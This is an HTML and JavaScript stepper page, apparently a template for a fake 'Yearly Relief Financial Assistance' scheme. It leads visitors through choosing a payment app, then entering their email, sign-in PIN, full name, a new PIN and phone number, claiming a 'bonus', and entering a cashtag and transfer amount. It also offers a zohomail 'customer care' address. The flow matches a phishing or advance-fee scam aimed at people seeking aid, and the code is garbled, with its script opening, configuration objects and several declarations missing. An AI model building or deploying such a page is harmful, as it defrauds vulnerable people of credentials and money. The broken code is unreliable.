<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Yearly Relief Financial Assistance Initiative — Stepper Form</title>
  <style>
    :root {
      --stepper-bg: rgba(6, 15, 34, 0.95);
      --stepper-border: rgba(226, 184, 47, 0.28);
      --stepper-gold: #e5b82f;
      --stepper-gold-glow: rgba(229, 184, 47, 0.35);
      --stepper-text: #f0f4fc;
      --stepper-muted: #8899b5;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html,
    body {
      width: 100%;
      min-height: 100%;
      background: #020716;
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      color: var(--stepper-text);
      overflow-x: hidden;
    }

    /* Fixed Master Stepper Header */
    #master-stepper {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      z-index: 999999;
      background: var(--stepper-bg);
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
      border-bottom: 1px solid var(--stepper-border);
      box-shadow: 0 4px 28px rgba(0, 0, 0, 0.6);
      transition: all 0.3s ease;
    }

    .stepper-nav-row {
      max-width: 1200px;
      margin: 0 auto;
      padding: 10px 18px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 16px;
    }

    .stepper-brand {
      display: flex;
      align-items: center;
      gap: 10px;
      cursor: pointer;
      user-select: none;
      flex-shrink: 0;
    }

    .stepper-badge {
      width: 34px;
      height: 34px;
      border-radius: 10px;
      background: linear-gradient(135deg, #ffe167, #d29d15);
      color: #0d121c;
      display: grid;
      place-items: center;
      font-size: 18px;
      font-weight: 800;
      box-shadow: 0 0 14px var(--stepper-gold-glow);
    }

    .stepper-titles {
      display: flex;
      flex-direction: column;
    }

    .stepper-main-title {
      font-size: 13px;
      font-weight: 850;
      letter-spacing: 0.5px;
      color: #fff;
    }

    .stepper-main-title span {
      color: var(--stepper-gold);
    }

    .stepper-step-desc {
      font-size: 11px;
      color: var(--stepper-muted);
      max-width: 220px;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    .stepper-center-info {
      flex: 1;
      max-width: 520px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 5px;
    }

    .stepper-progress-meta {
      width: 100%;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 11px;
      font-weight: 700;
      color: #c7d4ea;
    }

    .stepper-current-pill {
      background: rgba(229, 184, 47, 0.16);
      border: 1px solid rgba(229, 184, 47, 0.4);
      padding: 2px 10px;
      border-radius: 12px;
      color: #ffd95d;
      font-size: 11px;
    }

    .stepper-percent-label {
      color: var(--stepper-muted);
      font-size: 11px;
    }

    .stepper-progress-track {
      width: 100%;
      height: 6px;
      background: rgba(255, 255, 255, 0.08);
      border-radius: 99px;
      overflow: hidden;
      position: relative;
    }

    .stepper-progress-fill {
      height: 100%;
      width: 6.25%;
      background: linear-gradient(90deg, #ffe26d, #d69818, #3b82f6);
      border-radius: inherit;
      box-shadow: 0 0 12px rgba(229, 184, 47, 0.5);
      transition: width 0.35s cubic-bezier(0.4, 0, 0.2, 1);
    }

    .stepper-actions {
      display: flex;
      align-items: center;
      gap: 8px;
      flex-shrink: 0;
    }

    .stepper-btn {
      height: 34px;
      padding: 0 14px;
      border-radius: 9px;
      font-size: 12px;
      font-weight: 750;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      transition: all 0.2s ease;
      user-select: none;
      border: 0;
    }

    .stepper-btn-prev {
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255, 255, 255, 0.15);
      color: #c0cadb;
    }

    .stepper-btn-prev:hover:not(:disabled) {
      background: rgba(255, 255, 255, 0.16);
      color: #fff;
    }

    .stepper-btn-next {
      background: linear-gradient(135deg, #f7d558, #c99313);
      color: #0b111e;
      box-shadow: 0 2px 10px rgba(214, 157, 21, 0.3);
    }

    .stepper-btn-next:hover:not(:disabled) {
      filter: brightness(1.08);
      transform: translateY(-1px);
    }

    .stepper-btn:disabled {
      opacity: 0.35;
      cursor: not-allowed;
      transform: none !important;
    }

    .stepper-toggle-steps {
      width: 34px;
      height: 34px;
      border-radius: 9px;
      background: rgba(255, 255, 255, 0.06);
      border: 1px solid rgba(255, 255, 255, 0.12);
      color: #c7d2e4;
      display: grid;
      place-items: center;
      cursor: pointer;
      font-size: 14px;
      transition: all 0.2s ease;
    }

    .stepper-toggle-steps:hover {
      background: rgba(255, 255, 255, 0.12);
      color: #fff;
    }

    /* Expandable Step Navigator Drawer */
    #stepper-drawer {
      max-height: 0;
      overflow: hidden;
      background: rgba(4, 10, 24, 0.98);
      border-top: 1px solid rgba(255, 255, 255, 0.06);
      transition: max-height 0.35s cubic-bezier(0.4, 0, 0.2, 1);
    }

    #stepper-drawer.open {
      max-height: 240px;
      overflow-y: auto;
    }

    .stepper-grid {
      max-width: 1200px;
      margin: 0 auto;
      padding: 12px 18px;
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(135px, 1fr));
      gap: 8px;
    }

    .step-node {
      padding: 7px 10px;
      border-radius: 8px;
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid rgba(255, 255, 255, 0.07);
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 11px;
      color: #9ab0d2;
      transition: all 0.2s ease;
    }

    .step-node:hover {
      background: rgba(255, 255, 255, 0.08);
      border-color: rgba(229, 184, 47, 0.35);
      color: #fff;
    }

    .step-node.active {
      background: rgba(229, 184, 47, 0.14);
      border-color: #d8a623;
      color: #ffe074;
      font-weight: 700;
    }

    .step-node.completed {
      border-color: rgba(62, 166, 255, 0.4);
      color: #b5d5ff;
    }

    .step-node-num {
      width: 19px;
      height: 19px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.1);
      display: grid;
      place-items: center;
      font-size: 10px;
      font-weight: 800;
      flex-shrink: 0;
    }

    .step-node.active .step-node-num {
      background: #d8a623;
      color: #0b111e;
    }

    .step-node.completed .step-node-num {
      background: #2563eb;
      color: #fff;
    }

    .step-node-name {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }

    /* Container for step views */
    #stepper-container {
      width: 100%;
      min-height: 100vh;
      position: relative;
      padding-top: 54px;
      /* Space for the top stepper bar */
    }

    .step-host {
      display: none;
      width: 100%;
      min-height: calc(100vh - 54px);
      animation: fadeInStep 0.28s cubic-bezier(0.16, 1, 0.3, 1) forwards;
    }

    .step-host.active {
      display: block;
    }

    @keyframes fadeInStep {
      from {
        opacity: 0;
        transform: translateY(6px);
      }

      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    /* Completion Overlay */
    #completion-overlay {
      display: none;
      position: fixed;
      inset: 0;
      z-index: 1000000;
      background: rgba(2, 7, 22, 0.88);
      backdrop-filter: blur(12px);
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    #completion-overlay.show {
      display: flex;
      animation: fadeInStep 0.3s ease-out;
    }

    .completion-card {
      max-width: 480px;
      width: 100%;
      background: linear-gradient(145deg, #0a183d, #050d24);
      border: 1px solid rgba(226, 184, 47, 0.5);
      border-radius: 24px;
      padding: 36px 30px;
      text-align: center;
      box-shadow: 0 25px 65px rgba(0, 0, 0, 0.6);
      color: #fff;
    }

    .completion-icon {
      width: 72px;
      height: 72px;
      border-radius: 50%;
      background: linear-gradient(135deg, #ffd85b, #c99313);
      color: #0b111e;
      display: grid;
      place-items: center;
      font-size: 32px;
      margin: 0 auto 20px;
      box-shadow: 0 0 25px rgba(229, 184, 47, 0.4);
    }

    .completion-card h2 {
      font-size: 26px;
      margin-bottom: 10px;
      letter-spacing: -0.5px;
    }

    .completion-card p {
      color: #92a4c8;
      font-size: 14px;
      line-height: 1.6;
      margin-bottom: 24px;
    }

    .completion-btn-row {
      display: flex;
      gap: 12px;
      justify-content: center;
    }

    .completion-btn {
      padding: 13px 22px;
      border-radius: 13px;
      font-weight: 750;
      font-size: 14px;
      cursor: pointer;
      border: 0;
      transition: all 0.2s ease;
    }

    .btn-restart {
      background: linear-gradient(135deg, #ffe16b, #c68f08);
      color: #0c121e;
    }

    .btn-close {
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255, 255, 255, 0.15);
      color: #fff;
    }

    @media (max-width: 768px) {
      #stepper-container {
        padding-top: 48px;
      }

      .stepper-nav-row {
        padding: 8px 12px;
        gap: 10px;
      }

      .stepper-main-title {
        font-size: 12px;
      }

      .stepper-step-desc {
        display: none;
      }

      .stepper-center-info {
        max-width: 240px;
      }

      .stepper-btn {
        padding: 0 9px;
        font-size: 11px;
      }
    }

    @media (max-width: 480px) {
      .stepper-center-info {
        display: none;
      }
    }
  </style>
</head>

    // Payment Methods Configuration

    };

    // Stepper State
    let currentStep = 1;

    };

    // DOM Elements
    const prevBtn = document.getElementById('btn-global-prev');

    // Build Drawer Pills
    stepsMetadata.forEach(step => {
      const node = document.createElement('div');
      node.className = `step-node ${step.num === 1 ? 'active' : ''}`;
      node.id = `drawer-node-${step.num}`;
      node.innerHTML = `
        <span class="step-node-num">${step.num}</span>
        <span class="step-node-name" title="${step.title}">${step.title}</span>

        drawer.classList.remove('open');

      gridContainer.appendChild(node);

    // Populate each step's Shadow DOM
    stepsMetadata.forEach(step => {

      const shadow = host.attachShadow({ mode: 'open' });
      stepShadows[step.num] = shadow;
      shadow.innerHTML = `
        <style>${step.style}</style>
        <div class="step-view">
          ${step.body}
        </div>
      `;

      // Wire interactive events for step
      wireStepEvents(step.num, shadow);
    });

    // Apply any initial saved state to steps
    if (stepperState.selectedPaymentMethod) {
      updateStep4Method(stepperState.selectedPaymentMethod);
    }
    if (stepperState.email) {
      updateAllStepsEmail(stepperState.email);

    if (stepperState.selectedTransferMethod) {
      updateStep15Transfer(stepperState.selectedTransferMethod);
    }

    // Dynamic state update functions
    function updateStep4Method(methodName) {
      stepperState.selectedPaymentMethod = methodName;
      localStorage.setItem('selectedPaymentMethod', methodName);
      const s4 = stepShadows[4];

      const cfg = paymentMethodsMap[methodName];

      const iconEl = s4.querySelector('.method-icon');

      const labelEl = s4.querySelector('.field label');
      const inputEl = s4.querySelector('#demo-id');

      if (iconEl) {

        iconEl.style.background = cfg.bg;
        iconEl.style.color = cfg.color || '#fff';
      }
      if (strongEl) strongEl.textContent = cfg.name;
      if (labelEl) labelEl.textContent = cfg.label;
      if (inputEl) inputEl.placeholder = cfg.placeholder;
    }

    function updateAllStepsEmail(email) {
      if (!email) return;
      stepperState.email = email;
      localStorage.setItem('userEmail', email);

      // Step 6 input
      const s6 = stepShadows[6];
      if (s6) {
        const emailInp = s6.querySelector('#email');
        if (emailInp && !emailInp.value) emailInp.value = email;
      }

      // Step 7 display
      const s7 = stepShadows[7];
      if (s7) {
        const emailEl = s7.querySelector('#email');
        if (emailEl) emailEl.textContent = email;
      }

      // Step 8 display
      const s8 = stepShadows[8];
      if (s8) {
        const emailEl = s8.querySelector('.email');
        if (emailEl) emailEl.textContent = email;
      }

      // Step 9 display
      const s9 = stepShadows[9];
      if (s9) {
        const emailEl = s9.querySelector('.intro strong');
        if (emailEl) emailEl.textContent = email;
      }

      // Step 10 display
      const s10 = stepShadows[10];
      if (s10) {
        const emailEl = s10.querySelector('.welcome p');
        if (emailEl) emailEl.textContent = email;
      }

      // Step 11 display
      const s11 = stepShadows[11];
      if (s11) {
        const emailEl = s11.querySelector('.welcome p');
        if (emailEl) emailEl.textContent = email;
      }

      // Step 12 display
      const s12 = stepShadows[12];
      if (s12) {
        const emailEl = s12.querySelector('.welcome p');

      }

      // Step 13 display

      if (s13) {
        const emailEl = s13.querySelector('.welcome .email');
        if (emailEl) emailEl.textContent = email;
      }
    }

    function updateStep15Transfer(methodName) {
      stepperState.selectedTransferMethod = methodName;
      localStorage.setItem('selectedTransferMethod', methodName);
      const s15 = stepShadows[15];
      if (!s15) return;
      const cfg = transferMethodsMap[methodName];
      if (!cfg) return;

      const titleEl = s15.querySelector('.section-title');
      const labelEl = s15.querySelector('label[for="cashtag"]');
      const inputEl = s15.querySelector('#cashtag');

      if (titleEl) titleEl.innerHTML = `<span class="card-icon" aria-hidden="true"></span>${cfg.title}`;
      if (labelEl) labelEl.textContent = cfg.label;
      if (inputEl) inputEl.placeholder = cfg.placeholder;
    }

    function wireStepEvents(num, shadow) {
      if (num === 1) {
        const beginBtn = shadow.getElementById('begin');
        const notice = shadow.getElementById('notice');
        if (beginBtn) {
          beginBtn.addEventListener('click', () => {
            if (notice) notice.classList.add('visible');
            beginBtn.textContent = 'Application Started';
            setTimeout(() => goToStep(2), 400);
          });
        }
      } else if (num === 2) {
        const claimBtn = shadow.getElementById('claim');
        const notice = shadow.getElementById('notice');
        if (claimBtn) {
          claimBtn.addEventListener('click', () => {
            if (notice) notice.style.display = 'block';
            claimBtn.textContent = 'Continue';
            setTimeout(() => goToStep(3), 400);
          });
        }
      } else if (num === 3) {
        const methods = [...shadow.querySelectorAll('.method')];
        const next = shadow.querySelector('.continue');
        const notice = shadow.querySelector('.notice');
        const back = shadow.querySelector('.back');
        methods.forEach(btn => {
          btn.addEventListener('click', () => {
            methods.forEach(b => b.classList.remove('selected'));
            btn.classList.add('selected');
            if (next) {
              next.disabled = false;
              next.classList.add('active');
            }
            const methodName = btn.dataset.method || btn.textContent.trim();
            if (notice) {
              notice.textContent = `Selected: ${methodName}`;
              notice.style.display = 'block';
            }
            updateStep4Method(methodName);
          });
        });
        if (next) {
          next.addEventListener('click', () => {
            if (!next.disabled) goToStep(4);
          });
        }
        if (back) {
          back.addEventListener('click', () => goToStep(2));
        }
      } else if (num === 4) {
        const form = shadow.getElementById('demoForm');
        const back = shadow.querySelector('.back');
        const change = shadow.querySelector('.change');
        if (change) change.addEventListener('click', () => goToStep(3));
        if (back) back.addEventListener('click', () => goToStep(3));
        if (form) {
          form.addEventListener('submit', (e) => {
            e.preventDefault();
            const demoId = shadow.getElementById('demo-id');
            if (demoId) stepperState.demoId = demoId.value;
            goToStep(5);
          });
        }
      } else if (num === 5) {
        const cont = shadow.querySelector('.continue');
        if (cont) {
          cont.addEventListener('click', () => {
            const notice = shadow.querySelector('.notice');
            if (notice) notice.style.display = 'block';
            setTimeout(() => goToStep(6), 400);
          });
        }
      } else if (num === 6) {
        const form = shadow.getElementById('signInForm');
        const message = shadow.getElementById('message');
        const chatBtn = shadow.getElementById('chatButton');
        if (chatBtn) {
          chatBtn.addEventListener('click', () => {
            if (message) message.textContent = 'Support chat is ready to help.';
          });
        }
        if (form) {
          form.addEventListener('submit', (e) => {
            e.preventDefault();
            const emailInp = shadow.getElementById('email');
            if (emailInp && emailInp.value) {
              const enteredEmail = emailInp.value.trim();
              updateAllStepsEmail(enteredEmail);
              if (message) message.textContent = `We'll continue with ${enteredEmail}.`;
              setTimeout(() => goToStep(7), 400);
            }
          });
        }
      } else if (num === 7) {
        const form = shadow.querySelector('#login-form');
        const pin = shadow.querySelector('#pin');
        const toast = shadow.querySelector('#toast');
        const changeEmail = shadow.querySelector('#change-email');
        const forgot = shadow.querySelector('#forgot');
        const chat = shadow.querySelector('#chat');
        let timer;
        function showToast(msg) {
          if (!toast) return;
          toast.textContent = msg;
          toast.classList.add('show');
          clearTimeout(timer);
          timer = setTimeout(() => toast.classList.remove('show'), 2400);
        }
        if (chat) chat.addEventListener('click', () => showToast('Support chat is opening soon.'));
        if (forgot) forgot.addEventListener('click', () => showToast('PIN recovery instructions requested.'));
        if (changeEmail) changeEmail.addEventListener('click', () => goToStep(6));
        if (form) {
          form.addEventListener('submit', (e) => {
            e.preventDefault();
            if (pin && pin.value.length >= 4) {
              stepperState.pin = pin.value;
              showToast('Sign-in request submitted.');
              setTimeout(() => goToStep(8), 450);
            } else {
              showToast('Enter your PIN to continue.');
            }
          });
        }
      } else if (num === 8) {
        const form = shadow.getElementById('nameForm');
        const input = shadow.getElementById('fullName');
        const error = shadow.getElementById('error');
        const success = shadow.getElementById('success');
        const switchEmail = shadow.getElementById('switchEmail');
        const closeBtn = shadow.getElementById('close');
        const editBadge = shadow.getElementById('edit');
        if (closeBtn && editBadge) closeBtn.addEventListener('click', () => editBadge.remove());
        if (switchEmail) switchEmail.addEventListener('click', () => goToStep(6));
        if (form) {
          form.addEventListener('submit', (e) => {
            e.preventDefault();
            const valid = input && input.value.trim().split(/\s+/).length >= 2;
            if (error) error.style.display = valid ? 'none' : 'block';
            if (success) success.style.display = valid ? 'block' : 'none';
            if (valid) {
              stepperState.fullName = input.value.trim();
              setTimeout(() => goToStep(9), 450);
            } else if (input) {
              input.focus();
            }
          });
        }
      } else if (num === 9) {
        const form = shadow.getElementById('pinForm');
        const pin = shadow.getElementById('pin');
        const confirmPin = shadow.getElementById('confirmPin');
        const message = shadow.getElementById('message');
        [pin, confirmPin].forEach(inp => {
          if (inp) {
            inp.addEventListener('input', () => {
              inp.value = inp.value.replace(/\D/g, '').slice(0, 6);
              if (message) message.textContent = '';
            });
          }
        });
        if (form) {
          form.addEventListener('submit', (e) => {
            e.preventDefault();
            if (!pin || pin.value.length < 4) {
              if (message) message.textContent = 'Enter a 4–6 digit PIN.';
              if (pin) pin.focus();
              return;
            }
            if (pin.value !== confirmPin.value) {
              if (message) message.textContent = 'PINs do not match. Please try again.';
              if (confirmPin) confirmPin.focus();
              return;
            }
            if (message) message.textContent = 'PIN created successfully.';
            stepperState.createdPin = pin.value;
            setTimeout(() => goToStep(10), 450);
          });
        }
      } else if (num === 10) {
        const modal = shadow.getElementById('welcomeModal');
        const closeBtn = shadow.querySelector('.modal .close');
        const claimBtn = shadow.querySelector('.claim');
        const actionBtn = shadow.querySelector('.action');
        const toast = shadow.getElementById('toast');
        function showToast(msg) {
          if (!toast) return;
          toast.textContent = msg;
          toast.style.display = 'block';
          setTimeout(() => { toast.style.display = 'none'; }, 2200);
        }
        if (closeBtn) closeBtn.addEventListener('click', () => { if (modal) modal.style.display = 'none'; });
        if (claimBtn) {
          claimBtn.addEventListener('click', () => {
            if (modal) modal.style.display = 'none';
            showToast('Bonus claimed successfully!');
            setTimeout(() => goToStep(11), 500);
          });
        }
        if (actionBtn) {
          actionBtn.addEventListener('click', () => goToStep(11));
        }
      } else if (num === 11) {
        const form = shadow.querySelector('.modal form');
        const phone = shadow.getElementById('phone');
        if (form) {
          form.addEventListener('submit', (e) => {
            e.preventDefault();
            if (phone) stepperState.phone = phone.value;
            goToStep(12);
          });
        }
      } else if (num === 12) {
        const quickBtns = shadow.querySelectorAll('.quick button');
        if (quickBtns.length > 0) {
          quickBtns[0].addEventListener('click', () => goToStep(13));
        }
        if (quickBtns.length > 1) {
          quickBtns[1].addEventListener('click', () => alert('Deposit selected'));
        }
        if (quickBtns.length > 2) {
          quickBtns[2].addEventListener('click', () => alert('History selected'));
        }
        const copyBtn = shadow.querySelector('.copy');
        if (copyBtn) {
          copyBtn.addEventListener('click', () => {
            navigator.clipboard?.writeText('smartbnkcustomercare@zohomail.com');
            alert('Support email copied');
          });
        }
      } else if (num === 13) {
        const modal = shadow.getElementById('welcomeModal');
        const closeBtn = shadow.getElementById('closeModal');
        const claimBtn = shadow.getElementById('claimBonus');
        const toast = shadow.getElementById('toast');
        if (closeBtn && modal) closeBtn.addEventListener('click', () => modal.remove());
        if (claimBtn) {
          claimBtn.addEventListener('click', () => {
            if (modal) modal.remove();
            if (toast) {
              toast.classList.add('show');
              setTimeout(() => toast.classList.remove('show'), 1800);
            }
            setTimeout(() => goToStep(14), 500);
          });
        }
      } else if (num === 14) {
        const methodBtns = shadow.querySelectorAll('.method');
        const backBtn = shadow.querySelector('.back');
        const toast = shadow.getElementById('toast');
        function showToast(msg) {
          if (!toast) return;
          toast.textContent = msg;
          toast.classList.add('show');
          setTimeout(() => toast.classList.remove('show'), 1600);
        }
        methodBtns.forEach(btn => {
          btn.addEventListener('click', () => {
            const strong = btn.querySelector('strong');
            const name = strong ? strong.textContent.trim() : 'Method';
            showToast(name + ' selected');
            updateStep15Transfer(name);
            setTimeout(() => goToStep(15), 450);
          });
        });
        if (backBtn) backBtn.addEventListener('click', () => goToStep(13));
      } else if (num === 15) {
        const form = shadow.getElementById('transferForm');
        const cashtag = shadow.getElementById('cashtag');
        const amount = shadow.getElementById('amount');
        const confirmBtn = shadow.getElementById('confirm');
        const backBtn = shadow.querySelector('.back');
        const toast = shadow.getElementById('toast');
        function updateBtn() {
          const valid = Number(amount.value) > 0 && Number(amount.value) <= 10000;
          if (confirmBtn) confirmBtn.disabled = !cashtag.value.trim() || !valid;
        }
        if (cashtag) cashtag.addEventListener('input', updateBtn);
        if (amount) amount.addEventListener('input', updateBtn);
        if (backBtn) {
          backBtn.addEventListener('click', (e) => {
            e.preventDefault();
            goToStep(14);
          });
        }
        if (form) {
          form.addEventListener('submit', (e) => {
            e.preventDefault();
            if (toast) {
              toast.textContent = `Transfer request for $${Number(amount.value).toFixed(2)} is ready to review.`;
              toast.classList.add('show');
            }
            stepperState.cashtag = cashtag.value;
            stepperState.amount = amount.value;
            setTimeout(() => goToStep(16), 550);
          });
        }
      } else if (num === 16) {
        const modal = shadow.getElementById('modal');
        const shade = shadow.getElementById('shade');
        const closeBtn = shadow.getElementById('close');
        const understandBtn = shadow.getElementById('understand');
        const floating = shadow.getElementById('floating');
        const chat = shadow.getElementById('chat');
        const backBtn = shadow.querySelector('.back');
        if (backBtn) {
          backBtn.style.cursor = 'pointer';
          backBtn.addEventListener('click', () => goToStep(15));
        }
        if (closeBtn) {
          closeBtn.addEventListener('click', () => {
            if (modal) modal.style.display = 'none';
            if (shade) shade.style.display = 'none';
          });
        }
        if (understandBtn) {
          understandBtn.addEventListener('click', () => {
            if (modal) modal.style.display = 'none';
            if (shade) shade.style.display = 'none';
            completionOverlay.classList.add('show');
          });
        }
        if (floating) {
          floating.addEventListener('click', () => {
            if (modal) modal.style.display = 'block';
            if (shade) shade.style.display = 'block';
          });
        }
        if (chat) chat.addEventListener('click', () => alert('Demo only: live chat is not connected.'));
        if (shade) {
          shade.addEventListener('click', () => {
            if (modal) modal.style.display = 'none';
            if (shade) shade.style.display = 'none';
          });
        }
      }
    }

    // Step Navigation Controller
    function goToStep(target) {
      if (target < 1) target = 1;
      if (target > totalSteps) target = totalSteps;

      currentStep = target;

      // Update active host visibility
      for (let i = 1; i <= totalSteps; i++) {
        const host = document.getElementById(`step-host-${i}`);
        if (host) {
          if (i === currentStep) {
            host.classList.add('active');
          } else {
            host.classList.remove('active');
          }
        }
        // Update drawer pills
        const node = document.getElementById(`drawer-node-${i}`);
        if (node) {
          node.classList.remove('active', 'completed');
          if (i === currentStep) {
            node.classList.add('active');
          } else if (i < currentStep) {
            node.classList.add('completed');
          }
        }
      }

      // Update Stepper Progress UI
      const currentMeta = stepsMetadata[currentStep - 1];
      const percent = Math.round((currentStep / totalSteps) * 100);
      progressBar.style.width = `${percent}%`;
      pillText.textContent = `Step ${currentStep} of ${totalSteps}`;
      percentText.textContent = `${percent}% Completed`;
      stepTitleDesc.textContent = currentMeta.title;

      // Update buttons state
      prevBtn.disabled = (currentStep === 1);
      nextBtn.disabled = (currentStep === totalSteps);

      // Scroll to top
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    // Header buttons events
    prevBtn.addEventListener('click', () => goToStep(currentStep - 1));
    nextBtn.addEventListener('click', () => {
      if (currentStep === totalSteps) {
        completionOverlay.classList.add('show');
      } else {
        goToStep(currentStep + 1);
      }
    });
    brandHome.addEventListener('click', () => goToStep(1));

    toggleDrawerBtn.addEventListener('click', () => {
      drawer.classList.toggle('open');
    });

    // Completion modal actions
    document.getElementById('btn-restart-stepper').addEventListener('click', () => {
      completionOverlay.classList.remove('show');
      goToStep(1);
    });
    document.getElementById('btn-close-completion').addEventListener('click', () => {
      completionOverlay.classList.remove('show');
    });

    // Keyboard navigation
    window.addEventListener('keydown', (e) => {
      if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
      if (e.key === 'ArrowRight' || e.key === 'PageDown') {
        goToStep(currentStep + 1);
      } else if (e.key === 'ArrowLeft' || e.key === 'PageUp') {
        goToStep(currentStep - 1);
      }
    });

    // Initialize to Step 1
    goToStep(1);
  </script>
</body>

</html>
